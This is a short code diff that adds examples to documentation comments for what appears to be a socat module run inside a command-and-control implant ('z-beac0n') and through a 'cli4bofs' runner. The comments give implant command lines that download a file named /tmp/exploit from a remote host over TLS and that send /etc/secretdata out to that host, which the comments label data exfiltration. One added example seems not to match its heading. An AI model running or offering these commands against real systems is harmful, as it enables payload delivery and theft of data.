@@ -27,6 +27,8 @@
 ///
 ///   In the implant:
 ///     z-beac0n> socat --argv TLS:remotehost:8443 CREATE:/tmp/exploit
+///   Using cli4bofs:
+///     $ cli4bofs exec socat TLS:remotehost:8443 CREATE:/tmp/exploit
 ///
 /// Example use case 2: data exfiltration via TLS channel with z-beac0n:
 ///
@@ -37,6 +39,8 @@
 ///
 ///   In the implant:
 ///     z-beac0n> socat --argv OPEN:/etc/secretdata TLS:remotehost:8443
+///   Using cli4bofs:
+///     $ cli4bofs exec socat CREATE:/tmp/exploit TLS:remotehost:8443
 ///arguments:
 ///- name: src_address
 ///  desc: "path to a file that will be overwritten"
